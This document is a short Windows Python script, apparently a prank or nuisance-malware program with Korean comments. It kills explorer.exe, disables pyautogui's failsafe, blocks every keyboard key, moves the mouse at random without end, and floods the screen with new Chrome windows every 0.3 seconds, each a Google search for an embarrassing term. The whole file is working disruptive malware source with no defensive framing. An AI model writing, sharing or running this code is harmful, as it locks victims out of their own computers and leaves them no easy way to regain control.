import os
import keyboard
import random
import threading
import time
import pyautogui
import subprocess

# 안전장치 비활성화
pyautogui.FAILSAFE = False 
pyautogui.PAUSE = 0.001 

# 크롬 실행 파일 경로 (환경에 따라 수정 필요)
# 보통 윈도우 64비트 크롬 기본 경로
CHROME_PATH = r"C:\Program Files\Google\Chrome\Application\chrome.exe"

def block_everything():
    # 모든 키보드 입력 차단
    for i in range(150):
        try:
            keyboard.block_key(i)
        except:
            pass

def search_bomb():
    search_terms = [
        "컴퓨터 바이러스 없애는 법",
        "마인크래프트 무료 설치 2026 완벽 작동",
        "마이크로소프트를 훔치는 법",
        "Visual Studio 2022로 바이러스 만들기"
    ]
    
    while True:
        term = random.choice(search_terms)
        # --new-window 플래그를 사용하여 무조건 새 창으로 실행
        url = f"https://www.google.com/search?q={term}"
        try:
            subprocess.Popen([CHROME_PATH, "--new-window", url])
        except Exception:
            # 크롬이 없으면 기본 브라우저 사용
            import webbrowser
            webbrowser.open_new(url)
            
        time.sleep(0.3) # 0.3초마다 새 창 폭탄

def mouse_frenzy():
    width, height = pyautogui.size()
    while True:
        x = random.randint(0, width)
        y = random.randint(0, height)
        pyautogui.moveTo(x, y)

if __name__ == "__main__":
    if os.name == 'nt':
        # 바탕화면 마비
        os.system("taskkill /f /im explorer.exe")
        
        # 스레드 시작
        threading.Thread(target=block_everything, daemon=True).start()
        threading.Thread(target=search_bomb, daemon=True).start()
        threading.Thread(target=mouse_frenzy, daemon=True).start()
        
        # 무한 루프
        while True:
            time.sleep(1)
